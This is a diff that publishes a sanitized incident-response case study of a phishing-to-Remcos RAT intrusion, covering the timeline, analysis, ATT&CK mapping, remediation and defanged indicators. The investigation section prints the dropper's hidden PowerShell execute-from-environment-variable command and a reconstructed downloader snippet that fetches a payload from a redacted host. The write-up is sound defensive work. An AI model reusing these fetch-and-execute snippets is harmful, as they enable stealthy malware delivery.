@@ -1,39 +1,45 @@
 <!DOCTYPE HTML>
-<!-- DRAFT case page: not linked from anywhere, noindex, NOT in sitemap.xml.
-     GO-LIVE CHECKLIST (when the report is written):
-     1. Replace the placeholder title (in <title>, og:title-to-be, and the <h1>)
-        and write a real meta description.
-     2. Remove the <meta name="robots" noindex> line; add rel="canonical" and the
-        OG/Twitter block (copy from dfirwork.html, update url/title/description).
-     3. Add this page to sitemap.xml with a lastmod date.
-     4. On dfirwork.html: convert this case's card to <a class="case-card"
-        href="dfir-case-1.html">, remove the .case-status span, add the .case-cta line.
-     5. Screenshots: oxipng -o 4 --strip safe, explicit width/height,
-        loading="lazy" decoding="async", descriptive alt text. -->
+<!-- LIVE case page (published in update#59): indexed, in sitemap.xml, linked
+     from dfirwork.html. Content is a SANITIZED account of a real MDR/IR case —
+     see the anonymization note in-page. To add another case, copy this page +
+     a dfirwork.html card and keep the neutral dfir-case-N.html filename. -->
 <html lang="en">
 	<head>
-		<title>Web Server Compromise — From Initial Exploitation to Network Intrusion — Lorenzo Bertini</title>
+		<title>Fileless Malware Intrusion — From a Phishing Lure to a Remcos RAT — Lorenzo Bertini</title>
 		<meta charset="utf-8" />
 		<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; object-src 'none'; form-action 'none'; script-src 'self'; style-src 'self' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; upgrade-insecure-requests" />
 		<meta name="referrer" content="strict-origin-when-cross-origin" />
 		<meta name="viewport" content="width=device-width, initial-scale=1" />
 		<meta name="theme-color" content="#0d1117" />
-		<meta name="robots" content="noindex, nofollow" />
 		<link rel="preconnect" href="https://fonts.googleapis.com">
 		<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 		<link rel="preload" href="assets/fonts/dm-sans-latin.woff2" as="font" type="font/woff2" crossorigin>
 		<link rel="preload" href="assets/fonts/source-sans-3-latin.woff2" as="font" type="font/woff2" crossorigin>
 		<link rel="preload" href="assets/fonts/jetbrains-mono-latin.woff2" as="font" type="font/woff2" crossorigin>
 		<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Klee+One:wght@400;600&family=Shippori+Mincho:wght@500;600;700;800&display=swap">
-		<meta name="description" content="DFIR incident report — web server compromise investigation (write-up in progress)." />
+		<meta name="description" content="Sanitized DFIR case study: a phishing link delivered a fileless PowerShell dropper that hid its payload in a PNG and loaded a Remcos RAT — traced from alert to C2." />
+		<link rel="canonical" href="https://tektsunami.com/dfir-case-1.html" />
+
+		<meta property="og:type" content="article" />
+		<meta property="og:url" content="https://tektsunami.com/dfir-case-1.html" />
+		<meta property="og:site_name" content="Tek Tsunami" />
+		<meta property="og:title" content="Fileless Malware Intrusion — From a Phishing Lure to a Remcos RAT" />
+		<meta property="og:description" content="Sanitized DFIR case study: a phishing link delivered a fileless PowerShell dropper that hid its payload in a PNG and loaded a Remcos RAT — traced from alert to C2." />
+		<meta property="og:image" content="https://tektsunami.com/images/og-share.png" />
+		<meta property="og:image:width" content="1200" />
+		<meta property="og:image:height" content="630" />
+		<meta name="twitter:card" content="summary_large_image" />
+		<meta name="twitter:title" content="Fileless Malware Intrusion — From a Phishing Lure to a Remcos RAT" />
+		<meta name="twitter:description" content="Sanitized DFIR case study: a phishing link delivered a fileless PowerShell dropper that hid its payload in a PNG and loaded a Remcos RAT — traced from alert to C2." />
+		<meta name="twitter:image" content="https://tektsunami.com/images/og-share.png" />
 
 		<link rel="icon" type="image/svg+xml" href="images/logo-tek-favicon.svg?v=12">
 		<link rel="icon" type="image/x-icon" href="images/favvicon/favicon.ico?v=12">
 		<link rel="icon" type="image/png" sizes="32x32" href="images/favvicon/favicon-32x32.png?v=12">
 		<link rel="icon" type="image/png" sizes="16x16" href="images/favvicon/favicon-16x16.png?v=12">
 		<link rel="apple-touch-icon" href="images/apple-touch-icon.png?v=1">
-		<link rel="stylesheet" href="assets/css/main.css?v=34" />
-		<link rel="stylesheet" href="assets/css/theme.css?v=34" />
+		<link rel="stylesheet" href="assets/css/main.css?v=35" />
+		<link rel="stylesheet" href="assets/css/theme.css?v=35" />
 		<noscript><link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
 	</head>
 	<body class="is-preload page-article">
@@ -62,31 +68,144 @@
 					<div id="main">
 
 						<!-- Post -->
-					    <section class="post">
+						<section class="post">
 							<header class="major">
-							<h1>Web Server Compromise &mdash; From Initial Exploitation to Network Intrusion</h1>
-							<p>Incident report &mdash; write-up in progress.</p>
+								<h1>Fileless Malware Intrusion &mdash; From a Phishing Lure to a Remcos RAT</h1>
+								<p>Reconstructing a seven-minute intrusion: a trusted-app phishing link, a fileless PowerShell dropper, a payload hidden inside a PNG, and a Remcos remote-access trojan calling home.</p>
 							</header>
 
-							<p><i>All details in this report are anonymized to protect client confidentiality. Names, hosts, IP addresses, and timestamps are altered or omitted; the tradecraft and methodology described are real.</i></p>
+							<p><i>This is a sanitized account of a real Managed Detection and Response (MDR) investigation. Account names and hostnames are placeholders; network indicators are replaced with RFC&nbsp;2606 (example) domains and RFC&nbsp;5737 (documentation) IP ranges, and file hashes are withheld. The malware behavior, tooling, and analysis are real and unchanged.</i></p>
 
 							<h2>Executive Summary</h2>
-							<p>To be written.</p>
+							<p>On 3 June 2026, the MDR team alerted the client to a suspicious process on a user's workstation making an outbound connection to an external IP address. Incident response was initiated to determine the scope and impact of the activity. The investigation confirmed that a single user account on a single host was in scope; no lateral movement or additional affected systems were identified.</p>
+							<p>The root cause was a social-engineering lure. The user opened a link from within a trusted business application &mdash; a cloud case-management (CRM) platform &mdash; that downloaded a malicious JavaScript file disguised as a request-for-quotation (RFQ) document. Running that file launched a <b>fileless</b> infection chain: a hidden PowerShell dropper decoded a payload held entirely in memory, retrieved a second stage concealed inside a PNG image using steganography, and ultimately loaded <b>Remcos 7.2.5 Pro</b> &mdash; a commercial remote-access tool routinely abused for full remote control, credential theft, and surveillance. Almost nothing was written to disk, and the endpoint anti-virus raised no alert; it was network telemetry that exposed the command-and-control (C2) channel. Once the user ran the file, a live C2 connection was established in a matter of seconds.</p>
 
 							<h2>Timeline</h2>
-							<p>To be written.</p>
+							<p>All times UTC on 3 June 2026, drawn from DNS, EDR process, and Sysmon network-connection telemetry.</p>
+							<div class="table-wrapper">
+							<table>
+								<thead><tr><th>Time</th><th>Event</th></tr></thead>
+								<tbody>
+									<tr><td class="nowrap mono">12:04:39</td><td>User navigates to the attacker-controlled URL <span class="mono">hxxps://rfq-download[.]example/Request-for-Quotation.js</span> (link opened from a trusted business application); the JavaScript dropper is downloaded to the user's Downloads folder.</td></tr>
+									<tr><td class="nowrap mono">12:11:33</td><td>User executes <span class="mono">Request-for-Quotation.js</span> on host <span class="mono">WKSTN-01</span>. The script spawns a hidden PowerShell process via WMI; outbound connections are made to the hosting infrastructure (<span class="mono">192.0.2.11</span>, <span class="mono">192.0.2.12</span>).</td></tr>
+									<tr><td class="nowrap mono">12:11:35</td><td>The decoded payload stored in the <span class="mono">INTERNAL_DB_CACHE</span> environment variable executes and retrieves the second stage (<span class="mono">6363.png</span>) from an abused Cloudflare Workers subdomain.</td></tr>
+									<tr><td class="nowrap mono">12:11:36</td><td><span class="mono">MSBuild.exe</span> establishes an outbound command-and-control connection to <span class="mono">203.0.113.91:2026</span> &mdash; the Remcos C2 server.</td></tr>
+									<tr><td class="nowrap mono">12:11:37</td><td>A further connection retrieves the final payload from a Cloudflare R2 bucket (<span class="mono">hxxps://[redacted].r2[.]dev/6363.png</span>).</td></tr>
+								</tbody>
+							</table>
+							</div>
 
 							<h2>Investigation &amp; Analysis</h2>
-							<p>To be written.</p>
+
+							<h3>Initial access</h3>
+							<p>The client reported that the user had opened a support case in a cloud case-management platform and clicked an embedded link. Rather than arriving by email &mdash; where it would have been subject to gateway and attachment controls &mdash; the lure reached the user inside a trusted, authenticated business application, which is a large part of why it was clicked. DNS telemetry confirmed that at 12:04:39 UTC the host resolved and connected to the attacker-controlled URL <span class="mono">hxxps://rfq-download[.]example/Request-for-Quotation.js</span>, downloading a JavaScript file named to impersonate a request-for-quotation document &mdash; a common lure in business-email-compromise and malware-delivery campaigns.</p>
+							<p>The file landed at <span class="mono">D:\Users\jdoe\Downloads\Request-for-Quotation.js</span>. (The user profile residing on the <span class="mono">D:</span> volume is consistent with a cloud-hosted virtual desktop image.) A copy of the file was retrieved from the hosting URL in a controlled sandbox for analysis.</p>
+
+							<h3>The dropper: Request-for-Quotation.js</h3>
+							<p>Analysis showed that <span class="mono">Request-for-Quotation.js</span> is a <b>fileless dropper</b>. On execution it uses Windows Management Instrumentation (WMI) to launch a hidden PowerShell process, masking the activity as routine system-service behavior:</p>
+							<code>powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command [ScriptBlock]::Create(${env:INTERNAL_DB_CACHE})</code>
+							<p class="img-caption">Figure 1 &mdash; Hidden PowerShell command launched by the dropper on <span class="mono">WKSTN-01</span>.</p>
+							<p>The dropper decodes its true payload using layered <b>ROT13</b> and <b>hex-to-ASCII</b> transformations and writes the result into a user environment variable named <span class="mono">INTERNAL_DB_CACHE</span> &mdash; a deliberately mundane, database-sounding name chosen to blend into the environment. The PowerShell command above then reads that variable back and executes it directly in memory with <span class="mono">[ScriptBlock]::Create()</span>, so the malicious logic never lands on disk as a script file.</p>
+
+							<h3>Fileless execution and payload staging</h3>
+							<p>Sysmon network-connection logs showed the hidden PowerShell process connecting to the hosting infrastructure at 12:11:33, followed at 12:11:35 by execution of the <span class="mono">INTERNAL_DB_CACHE</span> payload &mdash; a heavily obfuscated PowerShell downloader. Two techniques stood out during analysis: variable and string names are randomized to defeat signatures, and the second-stage URL is split and reassembled at runtime to evade static extraction. In the example below, every <span class="mono">s</span> has been replaced with a <span class="mono">#</span> in the stored string and restored at runtime with a <span class="mono">.Replace('#','s')</span> call:</p>
+							<code>$url = 'http#://[redacted].worker#.dev/[redacted]'.Replace('#','s')<br />$wc  = New-Object Net.WebClient<br />$wc.Headers.Add('User-Agent','Mozilla/5.0')<br />$data = $wc.DownloadData($url)   # retrieves 6363.png<br /># ...remaining payload obfuscated / truncated...</code>
+							<p class="img-caption">Figure 2 &mdash; Reconstructed logic from the <span class="mono">INTERNAL_DB_CACHE</span> payload (variable names normalized, indicators sanitized). The real payload was several kilobytes of randomized, base64-like text.</p>
+							<p>The downloader spoofs a browser <span class="mono">User-Agent</span> and pulls a file called <span class="mono">6363.png</span> from a subdomain on Cloudflare's <span class="mono">workers.dev</span> platform. The specific subdomain incorporated the name of an unrelated developer account that had been abused to host the payload; that account name is redacted here.</p>
+
+							<h3>Secondary payload: steganography in a PNG</h3>
+							<p>The acquired <span class="mono">6363.png</span> masquerades as a harmless image but uses <b>steganography</b> to conceal an obfuscated, Base64-encoded .NET DLL. That DLL is a trojanised build of <b>Microsoft.Win32.TaskScheduler</b> &mdash; a legitimate open-source .NET library for managing Windows scheduled tasks &mdash; repurposed to act as an in-memory loader. Because it executes directly in memory, no corresponding file-write was observed on the local disk.</p>
+							<p>Once initialised, the loader reaches out to a second hosting location &mdash; a Cloudflare R2 bucket at <span class="mono">hxxps://[redacted].r2[.]dev/6363.png</span> &mdash; to retrieve, inject, and execute the final payload.</p>
+
+							<h3>Final payload: Remcos 7.2.5 Pro</h3>
+							<p>The final payload is <b>Remcos 7.2.5 Pro</b>, a commercial remote-administration tool heavily abused by threat actors for surveillance, data theft, and full remote control of infected systems. Consistent with the fileless design, no Remcos binary or on-disk execution artifact was found; its presence was confirmed by network telemetry &mdash; an outbound connection from <span class="mono">MSBuild.exe</span> (a trusted Microsoft build utility abused here as a living-off-the-land injection host) to the C2 server at <span class="mono">203.0.113.91</span> on port <span class="mono">2026</span>. That successful beacon confirmed the injection and command-and-control sequence had completed.</p>
+							<p>Anti-virus and third-party security logs were reviewed for any related detection or remediation events; none were found. No further suspicious activity was observed on the host after the C2 connection was established.</p>
 
 							<h2>Findings &amp; Root Cause</h2>
-							<p>To be written.</p>
+							<ul>
+								<li><b>Root cause &mdash; social engineering through a trusted channel.</b> The intrusion began with a user clicking a malicious link delivered inside an authenticated business application, bypassing the email-security controls that would normally inspect such a lure.</li>
+								<li><b>User execution was required.</b> The <span class="mono">.js</span> dropper only ran because the user opened it; on Windows, <span class="mono">.js</span> files execute through <span class="mono">wscript.exe</span> by default &mdash; a long-standing delivery weakness.</li>
+								<li><b>Fileless, in-memory tradecraft defeated disk-based detection.</b> The payload lived in an environment variable and executed via <span class="mono">[ScriptBlock]::Create()</span>; the loader and RAT ran in memory. The endpoint anti-virus produced no alert.</li>
+								<li><b>Living-off-the-land binaries (LOLBins).</b> The chain abused <span class="mono">wscript.exe</span>, <span class="mono">powershell.exe</span>, WMI, and <span class="mono">MSBuild.exe</span> &mdash; all legitimate, signed Windows components &mdash; to blend malicious activity into normal system behavior.</li>
+								<li><b>Detection came from the network.</b> With almost no disk footprint, it was the outbound C2 beacon on a non-standard port that surfaced the compromise &mdash; underscoring the value of network and behavioral telemetry alongside endpoint AV.</li>
+								<li><b>Scope.</b> A single user and a single host were affected; no lateral movement, additional hosts, or data exfiltration beyond the C2 channel were identified.</li>
+							</ul>
+
+							<h3>MITRE ATT&amp;CK techniques observed</h3>
+							<div class="table-wrapper">
+							<table>
+								<thead><tr><th>Tactic</th><th>ID</th><th>Technique</th></tr></thead>
+								<tbody>
+									<tr><td>Initial Access</td><td class="nowrap mono">T1566.002</td><td>Phishing: Spearphishing Link</td></tr>
+									<tr><td>Execution</td><td class="nowrap mono">T1204.002</td><td>User Execution: Malicious File</td></tr>
+									<tr><td>Execution</td><td class="nowrap mono">T1059.007</td><td>Command and Scripting Interpreter: JavaScript</td></tr>
+									<tr><td>Execution</td><td class="nowrap mono">T1059.001</td><td>Command and Scripting Interpreter: PowerShell</td></tr>
+									<tr><td>Execution</td><td class="nowrap mono">T1047</td><td>Windows Management Instrumentation</td></tr>
+									<tr><td>Defense Evasion</td><td class="nowrap mono">T1140</td><td>Deobfuscate/Decode Files or Information</td></tr>
+									<tr><td>Defense Evasion</td><td class="nowrap mono">T1027.003</td><td>Obfuscated Files or Information: Steganography</td></tr>
+									<tr><td>Defense Evasion</td><td class="nowrap mono">T1127.001</td><td>Trusted Developer Utilities Proxy Execution: MSBuild</td></tr>
+									<tr><td>Defense Evasion</td><td class="nowrap mono">T1055</td><td>Process Injection</td></tr>
+									<tr><td>Command &amp; Control</td><td class="nowrap mono">T1105</td><td>Ingress Tool Transfer</td></tr>
+									<tr><td>Command &amp; Control</td><td class="nowrap mono">T1071</td><td>Application Layer Protocol</td></tr>
+									<tr><td>Command &amp; Control</td><td class="nowrap mono">T1219</td><td>Remote Access Software (Remcos)</td></tr>
+								</tbody>
+							</table>
+							</div>
 
 							<h2>Containment &amp; Remediation</h2>
-							<p>To be written.</p>
+							<p>The following actions were recommended to contain the incident and restore the affected account and host to a trusted state:</p>
+							<ul>
+								<li><b>Rebuild the affected host from a known-good image.</b> Because the malware ran in memory and abused trusted system binaries, manual clean-up or an AV scan cannot be relied on to fully restore integrity; re-imaging from a trusted baseline is the safe option.</li>
+								<li><b>Reset credentials for the affected account.</b> All passwords used by the account should be changed promptly &mdash; including any stored in credential managers &mdash; on the assumption they may have been captured. Users should choose genuinely new passwords rather than incrementing a single character (e.g. <span class="mono">Example1!</span> &rarr; <span class="mono">Example2!</span>), in line with NIST memorized-secret guidance, and multi-factor authentication should be enforced.</li>
+								<li><b>Block the malicious domains and IP addresses</b> at all appropriate network controls &mdash; firewalls, web proxies, and DNS &mdash; including the lure host, the payload-hosting subdomains, and the C2 address and port.</li>
+								<li><b>Hunt for the indicators</b> in the appendix across the estate to confirm the activity was isolated to the single host.</li>
+							</ul>
+							<p>Response and blocking actions of this kind can be executed directly from the MDR platform's automation and response tooling.</p>
+
+							<h3>Corrective actions</h3>
+							<ul>
+								<li><b>User-awareness training.</b> Deliver phishing-awareness training &mdash; stressing that malicious links can arrive through trusted business applications, not only email &mdash; and give users a simple way to report suspicious links or messages to security for analysis. Repeat at regular intervals.</li>
+								<li><b>Restrict script execution.</b> Consider changing the default handler for <span class="mono">.js</span>/<span class="mono">.vbs</span> files so they open in a text editor rather than executing, and constrain PowerShell (Constrained Language Mode, script-block logging, and execution policy) where operationally feasible.</li>
+								<li><b>Egress filtering.</b> Restrict and monitor outbound traffic &mdash; particularly connections to non-standard ports and to newly-registered or low-reputation domains and developer-platform subdomains (<span class="mono">workers.dev</span>, <span class="mono">r2.dev</span> and similar).</li>
+							</ul>
 
 							<h2>Lessons Learned</h2>
-							<p>To be written.</p>
+							<ul>
+								<li><b>Trusted channels are a blind spot.</b> Email security did nothing here because the lure never touched email. Awareness training and detection logic have to account for links arriving through SaaS and business applications.</li>
+								<li><b>Endpoint AV alone is not enough against fileless malware.</b> Nothing meaningful was written to disk and AV stayed silent; the compromise was caught by network and behavioral telemetry. Defense in depth &mdash; EDR behavioral detection plus network monitoring &mdash; is what closed the gap.</li>
+								<li><b>Watch the LOLBins.</b> <span class="mono">wscript.exe</span> spawning <span class="mono">powershell.exe</span> via WMI, and <span class="mono">MSBuild.exe</span> making outbound connections, are high-signal behaviors worth alerting on regardless of the AV verdict.</li>
+								<li><b>Speed matters.</b> The automated chain went from execution to an established C2 channel in seconds. The window to disrupt an intrusion like this is short &mdash; which is exactly the case for fast, telemetry-driven detection and response.</li>
+							</ul>
+
+							<h2>Indicators of Compromise</h2>
+							<p>Indicators are sanitized for publication: domains use the RFC&nbsp;2606 <span class="mono">example</span> namespace, IP addresses use the RFC&nbsp;5737 documentation ranges, and file hashes are withheld. Notation is defanged (<span class="mono">hxxps</span>, <span class="mono">[.]</span>). The structure and relationships between indicators reflect the real activity.</p>
+
+							<h3>File indicators</h3>
+							<div class="table-wrapper">
+							<table>
+								<thead><tr><th>File</th><th>Path / SHA-256</th><th>Notes</th></tr></thead>
+								<tbody>
+									<tr><td class="mono">Request-for-Quotation.js</td><td class="mono">D:\Users\jdoe\Downloads\Request-for-Quotation.js<br />SHA-256: [withheld]</td><td>Initial payload &mdash; fileless JavaScript dropper</td></tr>
+									<tr><td class="mono">6363.png</td><td class="mono">SHA-256: [withheld]</td><td>Secondary payload &mdash; steganographic PNG concealing a trojanised Microsoft.Win32.TaskScheduler .NET loader DLL</td></tr>
+									<tr><td class="mono">Remcos 7.2.5 Pro</td><td class="mono">SHA-256: [withheld]</td><td>Final payload &mdash; commercial remote-access trojan, executed in memory</td></tr>
+								</tbody>
+							</table>
+							</div>
+
+							<h3>Network indicators</h3>
+							<div class="table-wrapper">
+							<table>
+								<thead><tr><th>Indicator</th><th>Type</th><th>Notes</th></tr></thead>
+								<tbody>
+									<tr><td class="mono">hxxps://rfq-download[.]example/Request-for-Quotation.js</td><td class="nowrap">URL / domain</td><td>Attacker-controlled lure host; delivered the dropper</td></tr>
+									<tr><td class="mono">192.0.2.11</td><td class="nowrap">IPv4</td><td>Contacted during dropper execution (hosting / front infrastructure)</td></tr>
+									<tr><td class="mono">192.0.2.12</td><td class="nowrap">IPv4</td><td>Contacted during dropper execution (hosting / front infrastructure)</td></tr>
+									<tr><td class="mono">hxxps://[redacted].workers[.]dev/[redacted]</td><td class="nowrap">URL</td><td>Cloudflare Workers subdomain (abused developer account) hosting 6363.png</td></tr>
+									<tr><td class="mono">hxxps://[redacted].r2[.]dev/6363.png</td><td class="nowrap">URL</td><td>Cloudflare R2 bucket hosting the final Remcos payload</td></tr>
+									<tr><td class="mono">203.0.113.91:2026</td><td class="nowrap">IPv4 : port</td><td>Remcos command-and-control server</td></tr>
+								</tbody>
+							</table>
+							</div>
 
 						</section>
 
@@ -124,7 +243,7 @@
 			<script src="assets/js/breakpoints.min.js"></script>
 			<script src="assets/js/util.js"></script>
 			<script src="assets/js/main.js"></script>
-			<script src="assets/js/site.js?v=34"></script>
+			<script src="assets/js/site.js?v=35"></script>
 
 	</body>
 </html>
